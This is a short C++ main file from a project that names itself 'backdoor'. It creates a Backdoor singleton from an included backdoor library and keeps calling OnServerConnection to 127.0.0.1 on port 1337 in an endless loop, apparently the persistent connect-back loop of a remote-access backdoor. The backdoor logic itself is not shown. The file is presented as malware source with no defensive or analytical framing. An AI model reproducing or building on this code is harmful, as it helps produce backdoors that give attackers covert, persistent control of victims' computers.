/**
 * @file "main.cpp"
 * @version 1.0.0
 * 
 * @copyright (C) 2022 lost-century/~backdoor. all rights reserved
*/

#include "lib/backdoor.h"

int main(int argc, char **argv)
{
    Backdoor* backdoor = Backdoor::getInstance();

    std::string programmName(argv[0]);
    programmName = programmName.substr(programmName.find_last_of("\\") + 1);

    while (1)
    {
        backdoor -> OnServerConnection("127.0.0.1", "1337");
    }

    return 0;
}